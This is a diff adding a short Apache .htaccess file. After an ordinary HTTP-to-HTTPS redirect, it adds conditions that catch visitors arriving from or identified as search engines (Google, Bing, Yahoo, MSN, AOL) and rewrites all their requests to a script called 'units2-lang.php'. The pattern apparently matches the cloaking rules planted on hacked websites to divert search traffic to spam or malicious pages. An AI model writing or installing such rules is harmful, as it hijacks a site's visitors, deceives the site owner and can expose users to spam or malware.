@@ -1,0 +1,10 @@
+RewriteEngine On
+RewriteCond %{SERVER_PORT} 80
+RewriteCond %{HTTPS} off
+RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
+RewriteCond %{HTTP_USER_AGENT} (msn|bing|yahoo|aol|google) [OR]
+RewriteCond %{HTTP_REFERER} (msn|bing|yahoo|aol|google)
+
+Redirect 301 /aotw.php /
+
+RewriteRule . units2-lang.php?$1 [L]
